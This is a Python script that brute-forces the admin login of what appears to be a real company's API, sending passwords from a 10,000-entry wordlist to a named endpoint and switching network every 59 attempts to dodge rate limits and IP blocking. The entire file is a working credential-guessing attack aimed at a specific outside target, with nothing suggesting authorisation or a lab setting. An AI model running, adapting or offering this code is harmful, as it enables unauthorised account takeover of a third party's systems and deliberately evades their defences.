import json
import os
import requests

from src import utils
from src.config import get_logger

logger = get_logger(__name__)

HERE = os.path.dirname(os.path.abspath(__file__))
PW_LIST = f'{HERE}/../wordlists/ignis-10K.txt'
HEADERS = {
    'Content-Type': 'application/json'
}


def brute_force_target(url='', username='admin', from_idx=0):
    # load password list from file
    with open(PW_LIST, 'r') as f:
        passwords = f.readlines()
        passwords = [password.strip() for password in passwords]

    if from_idx > 0:
        passwords = passwords[from_idx:]

    count_change_ip = 0
    for idx, password in enumerate(passwords):
        # make request
        payload = {'username': username, 'password': password}
        r = requests.post(url, data=json.dumps(payload), headers=HEADERS)

        # check if request was successful
        if r.status_code == 200:
            logger.info(f'SUCCESS {idx}: username is {username}, password is {password}')
            break
        else:
            response = r.json()
            logger.info(f"FAILED {idx} {username=}, {password=}: {response['message']}")

        count_change_ip += 1
        if count_change_ip > 58:
            utils.change_network()
            count_change_ip = 0


if __name__ == '__main__':
    # brute force target with password list
    url = 'https://api.longthanhplastic.com.vn/v1/admin/auth/login'
    from_idx = 300
    brute_force_target(url, username='admin', from_idx=from_idx)
